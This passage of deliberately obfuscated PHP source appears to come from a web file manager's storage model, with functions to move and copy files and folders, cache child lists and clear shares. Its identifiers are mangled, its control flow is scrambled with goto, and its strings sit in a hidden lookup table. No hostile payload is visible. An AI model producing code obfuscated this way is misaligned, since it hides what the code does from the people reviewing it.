goto B¼ªÀÂÄÒš; BÎŞÀ±Ğ™†: $F»¬§ÂêŸ’ = $this->_makeItemData($fğÖã²ŒÕ, $c¦ŒÈ‘å, $a‡ö¸ƒ†¨ª); Hook::trigger($D·¿èƒ³ô[510], $F»¬§ÂêŸ’); Hook::trigger($D·¿èƒ³ô[511], array($D·¿èƒ³ô[512], $F»¬§ÂêŸ’, 0)); goto cš‰ÕùæÁŸ; E«‚µ²‚®: foreach ($eò§¡±ó®° as $BÕçĞßŸá¢) { $EæÁÊãÒÔ» = $BÕçĞßŸá¢[$D·¿èƒ³ô[369]]; $dá¡¢Ò™êô = $this->_childrenMatch($a†À ‹¨îÕ, $BÕçĞßŸá¢, $BÄŸ—º¼‹£); $BœŸ¦ßØ¡[] = array($D·¿èƒ³ô[369], $EæÁÊãÒÔ», $D·¿èƒ³ô[463], $dá¡¢Ò™êô[$D·¿èƒ³ô[463]]); $Cİ¯¯ŞÎ[] = array($D·¿èƒ³ô[369], $EæÁÊãÒÔ», $D·¿èƒ³ô[461], $dá¡¢Ò™êô[$D·¿èƒ³ô[461]]); $this->_copyApplyMeta($BÕçĞßŸá¢, $AÀŠªÑ°ö); if ($BÕçĞßŸá¢[$D·¿èƒ³ô[370]] != $D·¿èƒ³ô[83]) { $AÀŠªÑ°ö[$D·¿èƒ³ô[503]][] = $BÕçĞßŸá¢[$D·¿èƒ³ô[419]]; } } $this->chunkEventSet($D·¿èƒ³ô[515], array($D·¿èƒ³ô[516], $F»¬§ÂêŸ’, $c¼ÌÉµ¥®â)); $this->saveAll($BœŸ¦ßØ¡); goto F°Ã¿’; EÌÑ‚¸°ù: $this->_childrenListAll($B—«Ö÷Âˆ, $EÇ™¶‹„£Õ); $c¼ÌÉµ¥®â = count($EÇ™¶‹„£Õ); if ($c¼ÌÉµ¥®â == 0) { return $a‰îéŞÚÜå; } goto b¡¢î¼ìô; eœ¬¥½ÎøŸ: $this->addAll($b—Ã«†¼¨‹, array(), !1); $eò§¡±ó®° = $this->where(array($D·¿èƒ³ô[463] => $a‰îéŞÚÜå))->select(); $a†À ‹¨îÕ = $this->_childrenMakeRelation($EÇ™¶‹„£Õ, $eò§¡±ó®°); goto d­™¡¡ƒ; A—ØŒÎ÷ŸÜ: } private function _childrenMakeRelation($EÆÂÓœî, $e¶Ãæùæà›) { $eÀ¢ªèˆ±Ÿ =& $_SERVER[¦·]; $DñİçøĞèŒ = array(); $CÀÀ¸èõÓ· = array(); foreach ($EÆÂÓœî as $Cµøáìâ¢) { $c¡Šâ²°ŸÃ = $Cµøáìâ¢[$eÀ¢ªèˆ±Ÿ[28]] . $eÀ¢ªèˆ±Ÿ[8] . $Cµøáìâ¢[$eÀ¢ªèˆ±Ÿ[461]]; $DñİçøĞèŒ[$c¡Šâ²°ŸÃ] = $Cµøáìâ¢[$eÀ¢ªèˆ±Ÿ[369]]; } foreach ($e¶Ãæùæà› as $Cµøáìâ¢) { $c¡Šâ²°ŸÃ = $Cµøáìâ¢[$eÀ¢ªèˆ±Ÿ[28]] . $eÀ¢ªèˆ±Ÿ[8] . $Cµøáìâ¢[$eÀ¢ªèˆ±Ÿ[461]]; $b æËÍªÒ = $DñİçøĞèŒ[$c¡Šâ²°ŸÃ]; $CÀÀ¸èõÓ·[$b æËÍªÒ] = $Cµøáìâ¢[$eÀ¢ªèˆ±Ÿ[369]]; } return $CÀÀ¸èõÓ·; } private function _childrenMatch($D×ŒÖ¦Ã¾¸, $Cîë½ÂÅì¾, $BÓ°ç×Ç±Œ) { goto dÎØœÁ·’Î; dÎØœÁ·’Î: $b¯¿îë”õŠ =& $_SERVER[¦·]; $b¡ËÂšš¨² = $BÓ°ç×Ç±Œ[$b¯¿îë”õŠ[461]]; $f°¼ÒŞÒ± = $this->parentLevelArray($Cîë½ÂÅì¾[$b¯¿îë”õŠ[461]]); goto aŸ†¥š‡¡; cÂßÑ¾¹Øî: $d°Ñ¾ÀŠÆÅ = $C›˜õ™³¶[count($C›˜õ™³¶) - 1]; return array($b¯¿îë”õŠ[463] => $d°Ñ¾ÀŠÆÅ, $b¯¿îë”õŠ[461] => $b¡ËÂšš¨²); goto eàÄ‹¼Ã‹; aŸ†¥š‡¡: foreach ($f°¼ÒŞÒ± as $aîÊ¡ó„š») { if (isset($D×ŒÖ¦Ã¾¸[$aîÊ¡ó„š»])) { $b¡ËÂšš¨² .= $D×ŒÖ¦Ã¾¸[$aîÊ¡ó„š»] . $b¯¿îë”õŠ[519]; } } $b¡ËÂšš¨² = rtrim($b¡ËÂšš¨², $b¯¿îë”õŠ[47]) . $b¯¿îë”õŠ[47]; $C›˜õ™³¶ = $this->parentLevelArray($b¡ËÂšš¨²); goto cÂßÑ¾¹Øî; eàÄ‹¼Ã‹: } private function _makeItemData($cÜîÖ¡´ôï, $bçêğò¬‘, $Fóö†‰Š ®) { $eŠ¬© É» =& $_SERVER[¦·]; $cšã¦…Èë… = array($eŠ¬© É»[520] => $cÜîÖ¡´ôï[$eŠ¬© É»[370]], $eŠ¬© É»[386] => $Fóö†‰Š ®, $eŠ¬© É»[521] => $cÜîÖ¡´ôï[$eŠ¬© É»[372]], $eŠ¬© É»[420] => $cÜîÖ¡´ôï[$eŠ¬© É»[419]], $eŠ¬© É»[522] => $cÜîÖ¡´ôï[$eŠ¬© É»[77]], $eŠ¬© É»[523] => $bçêğò¬‘[$eŠ¬© É»[371]], $eŠ¬© É»[524] => $bçêğò¬‘[$eŠ¬© É»[458]], $eŠ¬© É»[525] => USER_ID, $eŠ¬© É»[526] => USER_ID, $eŠ¬© É»[368] => $bçêğò¬‘[$eŠ¬© É»[369]], $eŠ¬© É»[527] => $bçêğò¬‘[$eŠ¬© É»[461]] . $bçêğò¬‘[$eŠ¬© É»[369]] . $eŠ¬© É»[47], $eŠ¬© É»[396] => 0, $eŠ¬© É»[528] => $eŠ¬© É»[33]); return $cšã¦…Èë…; } private function _copyApplyMeta($CÊö¯Ç£‚, &$Bª‘´²ÖÈ) { $d™¿æ±¾ ì =& $_SERVER[¦·]; $d ÉŸêç¾³ = $CÊö¯Ç£‚[$d™¿æ±¾ ì[369]]; $cŞšËºô° = $CÊö¯Ç£‚[$d™¿æ±¾ ì[28]]; if (!isset($CÊö¯Ç£‚[$d™¿æ±¾ ì[529]]) || !$CÊö¯Ç£‚[$d™¿æ±¾ ì[529]] || $CÊö¯Ç£‚[$d™¿æ±¾ ì[529]] == $d™¿æ±¾ ì[470]) { $Bª‘´²ÖÈ[$d™¿æ±¾ ì[505]][] = array($d™¿æ±¾ ì[369], $d ÉŸêç¾³, $d™¿æ±¾ ì[529], short_id($d ÉŸêç¾³)); } if (Input::check($cŞšËºô°, $d™¿æ±¾ ì[530])) { $Bª‘´²ÖÈ[$d™¿æ±¾ ì[504]][] = array($d™¿æ±¾ ì[369] => $d ÉŸêç¾³, $d™¿æ±¾ ì[89] => $d™¿æ±¾ ì[416], $d™¿æ±¾ ì[359] => str_replace($d™¿æ±¾ ì[50], $d™¿æ±¾ ì[33], Pinyin::encode($cŞšËºô°))); $Bª‘´²ÖÈ[$d™¿æ±¾ ì[504]][] = array($d™¿æ±¾ ì[369] => $d ÉŸêç¾³, $d™¿æ±¾ ì[89] => $d™¿æ±¾ ì[415], $d™¿æ±¾ ì[359] => Pinyin::encode($cŞšËºô°, $d™¿æ±¾ ì[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bµ»ìŸ¦„Í) { goto DÇ¼­ÌªÕ; FĞƒ¡ô…ã: $eõ³²ôÙÖò = array_to_keyvalue($eõ³²ôÙÖò, $A¼×ãæã‹¸[369]); foreach ($eõ³²ôÙÖò as $c¤è‘Ÿ³®å) { $e”£í‡™¹³ = $c¤è‘Ÿ³®å[$A¼×ãæã‹¸[463]]; $bµ»ìŸ¦„Í = $c¤è‘Ÿ³®å[$A¼×ãæã‹¸[369]]; if (!isset($this->_childrenListCache[$bµ»ìŸ¦„Í]) && $c¤è‘Ÿ³®å[$A¼×ãæã‹¸[370]] == $A¼×ãæã‹¸[83]) { $this->_childrenListCache[$bµ»ìŸ¦„Í] = array(); } if (!isset($this->_childrenListCache[$e”£í‡™¹³])) { $this->_childrenListCache[$e”£í‡™¹³] = array(); } $this->_childrenListCache[$e”£í‡™¹³][$bµ»ìŸ¦„Í] = $c¤è‘Ÿ³®å; $this->_childrenItemCache[$bµ»ìŸ¦„Í] = $c¤è‘Ÿ³®å; } goto c„çŠñÑé; DÇ¼­ÌªÕ: $A¼×ãæã‹¸ =& $_SERVER[¦·]; $BËïƒ…ëŞí = $this->sourceInfo($bµ»ìŸ¦„Í); $CÚ‡éÛã´ò = $A¼×ãæã‹¸[398]; goto C®÷ëƒ˜Ãñ; C®÷ëƒ˜Ãñ: $dÖÀ¼½òÚÉ = array($A¼×ãæã‹¸[461] => array($A¼×ãæã‹¸[485], $BËïƒ…ëŞí[$A¼×ãæã‹¸[461]] . $bµ»ìŸ¦„Í . $A¼×ãæã‹¸[486]), $A¼×ãæã‹¸[397] => $this->targetIsDelete); $eõ³²ôÙÖò = $this->field($CÚ‡éÛã´ò)->where($dÖÀ¼½òÚÉ)->select(); if (!$eõ³²ôÙÖò) { return; } goto FĞƒ¡ô…ã; c„çŠñÑé: } private function _childrenListAll($DÇÆÈˆåŸ, &$DÌˆ‚‘ö) { $D‹À¯²ŒêŠ =& $_SERVER[¦·]; if (!isset($this->_childrenListCache[$DÇÆÈˆåŸ])) { return; } $bÂ¾—Í†ñŠ = $this->_childrenListCache[$DÇÆÈˆåŸ]; foreach ($bÂ¾—Í†ñŠ as $FÖÕ»‡Š => $B’³òçÀº) { $DÌˆ‚‘ö[$FÖÕ»‡Š] = $B’³òçÀº; if ($B’³òçÀº[$D‹À¯²ŒêŠ[370]] == $D‹À¯²ŒêŠ[83]) { $this->_childrenListAll($FÖÕ»‡Š, $DÌˆ‚‘ö); } } } private function sourceInfoCache($eÈÁÕâ„­) { if (isset($this->_childrenItemCache[$eÈÁÕâ„­])) { return $this->_childrenItemCache[$eÈÁÕâ„­]; } return $this->sourceInfo($eÈÁÕâ„­); } private function _childrenList($FÜöµ¹ì£) { if (isset($this->_childrenListCache[$FÜöµ¹ì£])) { return $this->_childrenListCache[$FÜöµ¹ì£]; } return $this->_childrenListSelect($FÜöµ¹ì£); } private function _childrenListSelect($c¶å„æ˜ğÀ) { goto A÷Ü§‘Ä¾ì; BÛˆ‹Ÿª¯í: foreach ($b²ÉŸÈ¬‹ê as $c¶å„æ˜ğÀ => $fæÆ“™ïÉ˜) { $this->_childrenItemCache[$c¶å„æ˜ğÀ] = $fæÆ“™ïÉ˜; } return $b²ÉŸÈ¬‹ê; goto Dù¸ÒÙÚ; A÷Ü§‘Ä¾ì: $cÜÖ•£íÚÃ =& $_SERVER[¦·]; $aÆ¸Ãâí° = array($cÜÖ•£íÚÃ[463] => $c¶å„æ˜ğÀ, $cÜÖ•£íÚÃ[397] => $this->targetIsDelete); $DƒİÖçæ¦ = $this->where($aÆ¸Ãâí°)->select(); goto f‚´õª•Û»; f‚´õª•Û»: $DƒİÖçæ¦ = $DƒİÖçæ¦ ? $DƒİÖçæ¦ : array(); $b²ÉŸÈ¬‹ê = array_to_keyvalue($DƒİÖçæ¦, $cÜÖ•£íÚÃ[369]); $this->_childrenListCache[$c¶å„æ˜ğÀ] = $b²ÉŸÈ¬‹ê; goto BÛˆ‹Ÿª¯í; Dù¸ÒÙÚ: } private function fileNameExistCache($E¤ÕÍÜñ±³, $Aˆ¾Ü»‘§) { $cÆ†¶ªÚ £ =& $_SERVER[¦·]; $Aˆ¾Ü»‘§ = strtolower($Aˆ¾Ü»‘§); $A’·ÉƒÉ’í = $this->_childrenList($E¤ÕÍÜñ±³); foreach ($A’·ÉƒÉ’í as $a¸›¾êßœÜ) { if ($Aˆ¾Ü»‘§ == strtolower($a¸›¾êßœÜ[$cÆ†¶ªÚ £[28]])) { return $a¸›¾êßœÜ[$cÆ†¶ªÚ £[369]]; } } return !1; } private function fileNameAutoCache($Aù¶ÁÄ… ‘, $CÊ‡¸æ·ÀÈ, $BµÃö³¹½›, $B½Ì—©¶) { $Dßùö²Á‡æ =& $_SERVER[¦·]; $f‘­ãÜ†± = $this->_childrenList($Aù¶ÁÄ… ‘); $DÄâÖÓ¿¤Ò = array_to_keyvalue($f‘­ãÜ†±, $Dßùö²Á‡æ[33], $Dßùö²Á‡æ[28]); return $this->fileNameAutoGet($DÄâÖÓ¿¤Ò, $CÊ‡¸æ·ÀÈ, $BµÃö³¹½›, $B½Ì—©¶); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($eÉÃö¸²“Î, $bëÒ÷Šå‚, $cÒ»¨Ú‡Á = REPEAT_REPLACE, $C¶»í‰‰° = '') { goto EÀ‘‡¥¿öÅ; Aƒ¤†Äç¼«: $this->lockMoveEnd($eÉÃö¸²“Î); $this->lockWriteEnd($bëÒ÷Šå‚, $aõÔ§èÎ™); $this->folderSizeReset($d‹ÑËˆ†±î[$Dç»›à°Ä[463]]); goto c‚ïàÓì; c‚ïàÓì: $this->folderSizeReset($bëÒ÷Šå‚); $fò½ÑƒÍó = array($d‹ÑËˆ†±î[$Dç»›à°Ä[463]], $bëÒ÷Šå‚); if ($d‹ÑËˆ†±î[$Dç»›à°Ä[370]] == $Dç»›à°Ä[83]) { $fò½ÑƒÍó[] = $eÉÃö¸²“Î; } goto dƒƒ˜† ¤; EÀ‘‡¥¿öÅ: $Dç»›à°Ä =& $_SERVER[¦·]; $d‹ÑËˆ†±î = $this->sourceInfo($eÉÃö¸²“Î); $f¾î„×“Îä = $this->sourceInfo($bëÒ÷Šå‚); goto AÚŠ‰·áÍŠ; dƒƒ˜† ¤: $this->updateModifyTime($fò½ÑƒÍó); Model($Dç»›à°Ä[507])->eventMove($eÉÃö¸²“Î, $d‹ÑËˆ†±î[$Dç»›à°Ä[463]], $bëÒ÷Šå‚); Hook::trigger($Dç»›à°Ä[533], $dôÁ­‰š ); goto C‰‡¨´ÒŠ¨; c¯äùàó¬í: if ($d‹ÑËˆ†±î[$Dç»›à°Ä[370]] == $Dç»›à°Ä[83] && $DÃâæ—†¬õ) { $this->folderSizeResetChildren($fŠÈ¯Ï†Í½); } Model($Dç»›à°Ä[167])->linkAdd($fÃóåœ§¬[$Dç»›à°Ä[503]]); if ($DÃâæ—†¬õ && $fÃóåœ§¬[$Dç»›à°Ä[534]]) { $this->removeNow($eÉÃö¸²“Î, !1); } goto Aƒ¤†Äç¼«; cÔä…ˆ’¤Ä: if ($d‹ÑËˆ†±î[$Dç»›à°Ä[463]] == $bëÒ÷Šå‚ && $C¶»í‰‰° != $d‹ÑËˆ†±î[$Dç»›à°Ä[28]]) { $FÂ£ÄäéÃè = $this->fileNameExist($bëÒ÷Šå‚, $C¶»í‰‰°); if ($FÂ£ÄäéÃè && $d‹ÑËˆ†±î[$Dç»›à°Ä[370]] == $Dç»›à°Ä[470]) { goto f¬¿ª‰­–; AÃÔì›á™: $this->removeNow($eÉÃö¸²“Î, !1); $this->folderSizeReset($bëÒ÷Šå‚); Hook::trigger($Dç»›à°Ä[533], $dôÁ­‰š ); goto EÁÛÁ”ä„ğ; EÁÛÁ”ä„ğ: return $FÂ£ÄäéÃè; goto eØôâïÌì‘; f¬¿ª‰­–: $BâÓàåæ‚ = $this->sourceInfo($FÂ£ÄäéÃè); $fŠ²ƒñæÑŒ = $this->fileHistory($BâÓàåæ‚, $d‹ÑËˆ†±î[$Dç»›à°Ä[419]], $d‹ÑËˆ†±î[$Dç»›à°Ä[77]]); if (!$fŠ²ƒñæÑŒ) { Model($Dç»›à°Ä[422])->remove($d‹ÑËˆ†±î[$Dç»›à°Ä[419]]); } goto AÃÔì›á™; eØôâïÌì‘: } } $aõÔ§èÎ™ = $C¶»í‰‰° ? $C¶»í‰‰° : $d‹ÑËˆ†±î[$Dç»›à°Ä[28]]; $this->lockMoveStart($eÉÃö¸²“Î); goto cƒÜŒŞ¡¯¦; AÚŠ‰·áÍŠ: if ($d‹ÑËˆ†±î[$Dç»›à°Ä[463]] == $f¾î„×“Îä[$Dç»›à°Ä[369]]) { if ($d‹ÑËˆ†±î[$Dç»›à°Ä[397]] == $Dç»›à°Ä[83]) { Model($Dç»›à°Ä[395])->restore(array($eÉÃö¸²“Î)); } return $eÉÃö¸²“Î; } $dôÁ­‰š  = $this->pathInfoMore($eÉÃö¸²“Î); if ($this->isParentOf($eÉÃö¸²“Î, $bëÒ÷Šå‚)) { return !1; } goto aŸÍÃõ‘ª; aŸÍÃõ‘ª: if (!$d‹ÑËˆ†±î || !$f¾î„×“Îä || $f¾î„×“Îä[$Dç»›à°Ä[370]] != $Dç»›à°Ä[83]) { return !1; } Hook::trigger($Dç»›à°Ä[532], $dôÁ­‰š ); $this->targetIsDelete = intval($d‹ÑËˆ†±î[$Dç»›à°Ä[397]]); goto cÔä…ˆ’¤Ä; C‰‡¨´ÒŠ¨: return $fŠÈ¯Ï†Í½; goto c½ˆêŠ¢¼®; cƒÜŒŞ¡¯¦: $this->lockWriteStart($bëÒ÷Šå‚, $aõÔ§èÎ™); $fÃóåœ§¬ = array($Dç»›à°Ä[503] => array(), $Dç»›à°Ä[534] => !1); $this->clearShare($eÉÃö¸²“Î, $bëÒ÷Šå‚); goto aò‚Æœ…õ; aò‚Æœ…õ: $DÃâæ—†¬õ = $this->fileNameExistCache($bëÒ÷Šå‚, $d‹ÑËˆ†±î[$Dç»›à°Ä[28]]); $fŠÈ¯Ï†Í½ = $this->_move($eÉÃö¸²“Î, $bëÒ÷Šå‚, $cÒ»¨Ú‡Á, $fÃóåœ§¬, $C¶»í‰‰°); $this->sourceCacheClear(); goto c¯äùàó¬í; c½ˆêŠ¢¼®: } private function _move($dƒ§ÁñÙù‘, $Dï¿ê¡ÙØ­, $dŠ¯›´, &$B¦‹…¶Ç«, $Dê…Ì½óÄ = '') { goto aäˆñÉø¢; aäˆñÉø¢: $a †ñ—‘’‡ =& $_SERVER[¦·]; $B‡’º·±º  = $this->sourceInfo($dƒ§ÁñÙù‘); $E¹ÙÉéß™¿ = $B‡’º·±º [$a †ñ—‘’‡[370]] == $a †ñ—‘’‡[83]; goto E‚„Óßº¬±; C‹‘¨ğ‚»Û: $this->lockWriteStart($Dï¿ê¡ÙØ­, $eÏ¼µî¦ë); if (!$A–éÂ¤İ‹‡) { return $this->_moveForce($dƒ§ÁñÙù‘, $Dï¿ê¡ÙØ­, $eÏ¼µî¦ë); } $BÙÎ¦”Á—í = $A–éÂ¤İ‹‡; goto A‚†Ÿá‹È; A‚†Ÿá‹È: $Bóäã«óâ = !1; if ($E¹ÙÉéß™¿) { if ($dŠ¯›´ == REPEAT_RENAME_FOLDER) { $eÏ¼µî¦ë = $this->fileNameAuto($Dï¿ê¡ÙØ­, $eÏ¼µî¦ë, $dŠ¯›´, $E¹ÙÉéß™¿); $BÙÎ¦”Á—í = $this->_moveForce($dƒ§ÁñÙù‘, $Dï¿ê¡ÙØ­, $eÏ¼µî¦ë); } else { if ($dŠ¯›´ == REPEAT_RENAME_FOLDER) { $dŠ¯›´ = REPEAT_RENAME; } $c–¢‚¼—®İ = $this->_childrenListSelect($dƒ§ÁñÙù‘); foreach ($c–¢‚¼—®İ as $aëÂ¬¬‚ÓÎ) { $this->_move($aëÂ¬¬‚ÓÎ[$a †ñ—‘’‡[369]], $A–éÂ¤İ‹‡, $dŠ¯›´, $B¦‹…¶Ç«); } $Bóäã«óâ = !0; } } else { if ($dŠ¯›´ == REPEAT_SKIP) { $Bóäã«óâ = !0; } else { if ($dŠ¯›´ == REPEAT_RENAME || $dŠ¯›´ == REPEAT_RENAME_FOLDER) { $eÏ¼µî¦ë = $this->fileNameAuto($Dï¿ê¡ÙØ­, $eÏ¼µî¦ë, $dŠ¯›´, $E¹ÙÉéß™¿); $BÙÎ¦”Á—í = $this->_moveForce($dƒ§ÁñÙù‘, $Dï¿ê¡ÙØ­, $eÏ¼µî¦ë); } else { if ($dŠ¯›´ == REPEAT_REPLACE) { $b½È¢›™Î = $this->sourceInfoCache($A–éÂ¤İ‹‡); $D¨¶é¤‰ïí = $this->fileHistory($b½È¢›™Î, $B‡’º·±º [$a †ñ—‘’‡[419]], $B‡’º·±º [$a †ñ—‘’‡[77]]); if ($D¨¶é¤‰ïí) { $B¦‹…¶Ç«[$a †ñ—‘’‡[503]][] = $B‡’º·±º [$a †ñ—‘’‡[419]]; } else { $Bóäã«óâ = !0; } } } } } if ($Bóäã«óâ && !$B¦‹…¶Ç«[$a †ñ—‘’‡[534]]) { $B¦‹…¶Ç«[$a †ñ—‘’‡[534]] = !0; } goto Eö Ëµ‚Œ¢; Eö Ëµ‚Œ¢: return $BÙÎ¦”Á—í; goto CÌÂˆÓ™; E‚„Óßº¬±: $eÏ¼µî¦ë = $Dê…Ì½óÄ ? $Dê…Ì½óÄ : $B‡’º·±º [$a †ñ—‘’‡[28]]; $A–éÂ¤İ‹‡ = $this->fileNameExistCache($Dï¿ê¡ÙØ­, $eÏ¼µî¦ë); $this->lockMoveStart($dƒ§ÁñÙù‘); goto C‹‘¨ğ‚»Û; CÌÂˆÓ™: } private function _moveForce($B‹‰¢§ËÀ›, $B§Ú§Ò¼óÌ, $cÑƒ±Èï©) { goto eñšãğè¢›; aÇÖî”Ìò: if ($A¨‹ÜÆ‡ñ¨) { $b¯´á»ˆ–• = array($Féóà’öŒï[527] => array($Féóà’öŒï[485], $FÃÅ¼‘ÁÈê[$Féóà’öŒï[461]] . $FÃÅ¼‘ÁÈê[$Féóà’öŒï[369]] . $Féóà’öŒï[486])); $eÜíÌ«Â = $FÃÅ¼‘ÁÈê[$Féóà’öŒï[461]] . $FÃÅ¼‘ÁÈê[$Féóà’öŒï[369]] . $Féóà’öŒï[47]; $fá ´è™ñ¸ = $d„”ëÄ³Æ[$Féóà’öŒï[461]] . $d„”ëÄ³Æ[$Féóà’öŒï[369]] . $Féóà’öŒï[47] . $FÃÅ¼‘ÁÈê[$Féóà’öŒï[369]] . $Féóà’öŒï[47]; $BÎô–½È´œ = array($Féóà’öŒï[527] => array($Féóà’öŒï[535], "\162\x65\x70\x6c\x61\143\x65\50\x70\141\162\145\156\x74\114\145\166\145\154\x2c\x27{$eÜíÌ«Â}\47\54\47{$fá ´è™ñ¸}\47\x29"), $Féóà’öŒï[523] => $d„”ëÄ³Æ[$Féóà’öŒï[371]], $Féóà’öŒï[524] => $d„”ëÄ³Æ[$Féóà’öŒï[458]]); if ($FêÌµêÌÅÂ) { $BÎô–½È´œ[$Féóà’öŒï[396]] = 0; } $this->where($b¯´á»ˆ–•)->data($BÎô–½È´œ)->save(); } $this->where(array($Féóà’öŒï[383] => $B‹‰¢§ËÀ›))->data($cìçÀ©ÄóŒ)->save(); return $B‹‰¢§ËÀ›; goto BÇ‡Ş˜İ; Fñ’ÊÚ†â: $A¨‹ÜÆ‡ñ¨ = $FÃÅ¼‘ÁÈê[$Féóà’öŒï[370]] == $Féóà’öŒï[83]; $cìçÀ©ÄóŒ = array($Féóà’öŒï[368] => $d„”ëÄ³Æ[$Féóà’öŒï[369]], $Féóà’öŒï[527] => $d„”ëÄ³Æ[$Féóà’öŒï[461]] . $d„”ëÄ³Æ[$Féóà’öŒï[369]] . $Féóà’öŒï[47], $Féóà’öŒï[523] => $d„”ëÄ³Æ[$Féóà’öŒï[371]], $Féóà’öŒï[524] => $d„”ëÄ³Æ[$Féóà’öŒï[458]], $Féóà’öŒï[526] => USER_ID, $Féóà’öŒï[386] => $cÑƒ±Èï©); $eİ¾Ş¯ÈĞê = $FÃÅ¼‘ÁÈê[$Féóà’öŒï[371]] == SourceModel::TYPE_GROUP && $d„”ëÄ³Æ[$Féóà’öŒï[371]] == SourceModel::TYPE_GROUP && $FÃÅ¼‘ÁÈê[$Féóà’öŒï[458]] == $d„”ëÄ³Æ[$Féóà’öŒï[458]]; goto cù»ñÜ íÌ; cù»ñÜ íÌ: if (!$eİ¾Ş¯ÈĞê) { Model($Féóà’öŒï[456])->authClear($B‹‰¢§ËÀ›); } $FêÌµêÌÅÂ = $FÃÅ¼‘ÁÈê[$Féóà’öŒï[397]] == $Féóà’öŒï[83] && $d„”ëÄ³Æ[$Féóà’öŒï[397]] != $Féóà’öŒï[83]; if ($FêÌµêÌÅÂ) { $cìçÀ©ÄóŒ[$Féóà’öŒï[396]] = 0; } goto aÇÖî”Ìò; eñšãğè¢›: $Féóà’öŒï =& $_SERVER[¦·]; $FÃÅ¼‘ÁÈê = $this->sourceInfo($B‹‰¢§ËÀ›); $d„”ëÄ³Æ = $this->sourceInfo($B§Ú§Ò¼óÌ); goto Fñ’ÊÚ†â; BÇ‡Ş˜İ: } private function clearShare($Cº£¶¯¶¥í, $BŞ·–ì…•ò) { goto CÛâËë…¡; cÁÇ‚â¸¸Æ: if (!$Cë§¨ãĞ¥±) { return; } $Cë§¨ãĞ¥± = array_to_keyvalue($Cë§¨ãĞ¥±, $CàÃ‰ùğ…ç[33], $CàÃ‰ùğ…ç[441]); $Bâî¢³ÂË = array($CàÃ‰ùğ…ç[441] => array($CàÃ‰ùğ…ç[7], $Cë§¨ãĞ¥±)); goto D…­¥ë¯ã; CÛâËë…¡: $CàÃ‰ùğ…ç =& $_SERVER[¦·]; $BåÕá£ = $this->sourceInfo($Cº£¶¯¶¥í); $AƒÎå¦çÚÈ = $this->sourceInfo($BŞ·–ì…•ò); goto EÎ’ù‰è; bÂ“‰‹êÕ: if (!$a÷˜Œ‚í›¿) { return; } $Bâî¢³ÂË = array($CàÃ‰ùğ…ç[369] => array($CàÃ‰ùğ…ç[7], $a÷˜Œ‚í›¿), $CàÃ‰ùğ…ç[448] => 1); $Cë§¨ãĞ¥± = Model($CàÃ‰ùğ…ç[537])->field($CàÃ‰ùğ…ç[441])->where($Bâî¢³ÂË)->select(); goto cÁÇ‚â¸¸Æ; EÎ’ù‰è: if ($BåÕá£[$CàÃ‰ùğ…ç[458]] == $AƒÎå¦çÚÈ[$CàÃ‰ùğ…ç[458]] && $BåÕá£[$CàÃ‰ùğ…ç[371]] == $CàÃ‰ùğ…ç[536]) { return; } $Bâî¢³ÂË = array($CàÃ‰ùğ…ç[461] => array($CàÃ‰ùğ…ç[485], $BåÕá£[$CàÃ‰ùğ…ç[461]] . $Cº£¶¯¶¥í . $CàÃ‰ùğ…ç[486])); $a÷˜Œ‚í›¿ = $this->field($CàÃ‰ùğ…ç[383])->where($Bâî¢³ÂË)->getField($CàÃ‰ùğ…ç[369], !0); goto bÂ“‰‹êÕ; D…­¥ë¯ã: Model($CàÃ‰ùğ…ç[537])->where($Bâî¢³ÂË)->save(array($CàÃ‰ùğ…ç[448] => 0)); Model($CàÃ‰ùğ…ç[538])->where($Bâî¢³ÂË)->delete(); goto d¼äç‰â; d¼äç‰â: } public function copyFolderFromIO($Cøµé¡¨¨, $C÷å™àÌ‹Ó, $d‚†•ã“´, $fñİğ‘õíˆ, $A¯Õ†ù–¨Ù, $AÚø…¡Û°ì = false) { goto b»ãæ„˜Š; BŒ£ˆ·—“ù: $this->updateModifyTime($d‚†•ã“´); return $aÖÁ´…¦œ§; goto Cî‰Ùğİ®ï; E‰îëÚ¨–—: Model($d§á¶ÎªñÍ[506])->addAll($dÇÊšŒƒ‘[$d§á¶ÎªñÍ[504]], array(), !0); Model($d§á¶ÎªñÍ[507])->eventCopy($aÖÁ´…¦œ§); $this->saveAll($dÇÊšŒƒ‘[$d§á¶ÎªñÍ[505]]); goto dÙÅ¯“½îÃ; dÙÅ¯“½îÃ: Model($d§á¶ÎªñÍ[422])->linkAdd($dÇÊšŒƒ‘[$d§á¶ÎªñÍ[503]]); Model($d§á¶ÎªñÍ[422])->remove($dÇÊšŒƒ‘[$d§á¶ÎªñÍ[539]]); $this->folderSizeReset($d‚†•ã“´); goto BŒ£ˆ·—“ù; Eè¦é”ß: if ($E«ß¶Ø›­„) { $this->_childrenAllMake($E«ß¶Ø›­„); } Hook::trigger($d§á¶ÎªñÍ[540]); $this->_copyChildTo($Cøµé¡¨¨, $C÷å™àÌ‹Ó, $aÖÁ´…¦œ§, $fñİğ‘õíˆ, $dÇÊšŒƒ‘, $A¯Õ†ù–¨Ù); goto c×õ™‚Ì÷; c×õ™‚Ì÷: Hook::trigger($d§á¶ÎªñÍ[541]); if ($aÖÁ´…¦œ§) { $this->folderSizeResetChildren($aÖÁ´…¦œ§); } $this->_childrenListClear(); goto E‰îëÚ¨–—; b»ãæ„˜Š: $d§á¶ÎªñÍ =& $_SERVER[¦·]; $dÇÊšŒƒ‘ = array($d§á¶ÎªñÍ[504] => array(), $d§á¶ÎªñÍ[505] => array(), $d§á¶ÎªñÍ[503] => array(), $d§á¶ÎªñÍ[539] => array()); $a™ï³³Íœ = $AÚø…¡Û°ì ? $AÚø…¡Û°ì : $Cøµé¡¨¨->getPathName($Cøµé¡¨¨->pathThis($C÷å™àÌ‹Ó)); goto eØÚâí‹Ô¤; eØÚâí‹Ô¤: $E«ß¶Ø›­„ = $this->fileNameExist($d‚†•ã“´, $a™ï³³Íœ); $aÖÁ´…¦œ§ = $this->mkdir($d‚†•ã“´, $a™ï³³Íœ, $fñİğ‘õíˆ); if (!$E«ß¶Ø›­„ || $fñİğ‘õíˆ == REPEAT_RENAME_FOLDER) { $fñİğ‘õíˆ = !1; } goto Eè¦é”ß; Cî‰Ùğİ®ï: } private function _copyChildTo($aµŒ¤©Íè, $eÏœØùÇÇ, $bÙõ×¬ÈÁ, $CŒ§†Ëí†‡, &$A»‘¸Ÿ¾¸é, $C‡ÖèƒÅÓÍ) { goto EĞ„Ó’ÈŸ‰; BˆÑĞ×´Ä: 